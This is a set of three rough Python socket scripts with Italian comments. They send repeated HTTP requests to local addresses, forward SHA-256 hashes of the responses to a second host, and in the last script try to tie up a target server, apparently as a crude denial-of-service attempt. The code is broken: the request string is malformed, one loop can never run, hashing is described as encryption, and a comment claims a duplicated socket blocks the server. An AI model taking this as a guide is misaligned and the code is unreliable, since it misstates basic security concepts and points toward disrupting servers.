import os 
import socket 
#atento a quello che fai con questo ageggo
file=open("nomefile.py","w")
file.write("print('questo e un stringa in un file apena  grato ')")
file=open("nomefile.py","r")
file.close()

service=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
service.connect(("192.168.1.20",80))
print(service)
richeista="GET /HTTP/1.1/nHosto: 192.168.1.20\n\n"
service.send(richeista.encode())
risposta=service.recv(2048)
print(risposta)
while len(risposta) < 0:
    print(risposta)
    risposta=service.recv(2048)


2
import socket
import threading
import hashlib

def invia_richieste():
    while True:
        try:
            # Crea un socket e si connette al server
            service = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            service.connect(("192.168.1.20", 80))

            # Invia una richiesta HTTP al server
            richiesta = "GET / HTTP/1.1\nHost: 192.168.1.20\n\n"
            service.send(richiesta.encode())

            # Ricevi la risposta dal server
            risposta = service.recv(2048)
            service.close()

            # "Gripta" i dati
            dati_griptati = grip_dati(risposta)

            # Invia i dati "griptati" a un indirizzo IP
            invia_a_indirizzo(dati_griptati, "192.168.1.30")

        except Exception as e:
            print("Errore:", e)

def grip_dati(dati):
    # Usa l'algoritmo SHA-256 per criptare i dati
    hashed_data = hashlib.sha256(dati).hexdigest()
    return hashed_data

def invia_a_indirizzo(dati, indirizzo_destinazione):
    # Invia i dati a un indirizzo IP specifico
    try:
        # Esempio di invio dei dati tramite socket TCP
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((indirizzo_destinazione, 8080))
            s.sendall(dati.encode())
            print("Dati inviati con successo a", indirizzo_destinazione)
    except Exception as e:
        print("Errore durante l'invio dei dati a", indirizzo_destinazione, ":", e)

# Avvia il thread per inviare le richieste
thread = threading.Thread(target=invia_richieste)
thread.start()




1

import socket
import threading

def invia_richieste():
    while True:
        try:
            # Crea un socket e si connette al server
            service = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            service.connect(("ip", 80))

            # Invia una richiesta HTTP al server
            richiesta = "GET / HTTP/1.1\nHost: ip\n\n"
            service.send(richiesta.encode())

            # Duplica e blocca il socket del server
            duplicate_service = service.dup()
            service.close()

            # Blocca il socket del server per impedire ulteriori richieste
            duplicate_service.setblocking(True)
            while True:
                duplicate_service.recv(2048)

        except Exception as e:
            print("Errore:", e)

# Avvia il thread per inviare le richieste
thread = threading.Thread(target=invia_richieste)
thread.start()

    

